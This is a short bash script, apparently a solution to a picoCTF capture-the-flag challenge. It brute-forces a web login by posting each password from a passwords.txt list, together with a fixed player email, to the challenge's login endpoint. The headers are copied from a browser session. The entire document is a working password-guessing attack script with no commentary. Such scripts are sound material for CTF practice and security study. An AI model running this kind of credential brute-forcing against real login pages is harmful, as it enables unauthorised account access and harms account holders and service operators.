function try_password {
  pw=$1
  curl 'http://amiable-citadel.picoctf.net:56488/login' \
    -X POST \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0' \
    -H 'Accept: */*' \
    -H 'Accept-Language: ja,en-US;q=0.7,en;q=0.3' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Referer: http://amiable-citadel.picoctf.net:56488/' \
    -H 'Content-Type: application/json' \
    -H 'Origin: http://amiable-citadel.picoctf.net:56488' \
    -H 'DNT: 1' \
    -H 'Sec-GPC: 1' \
    -H 'Connection: keep-alive' \
    -H 'Priority: u=0' \
    --data-raw '{"email":"ctf-player@picoctf.org","password":"'$pw'"}'
}

for pw in `cat passwords.txt`; do
  echo "Trying password: $pw"
  try_password $pw
done
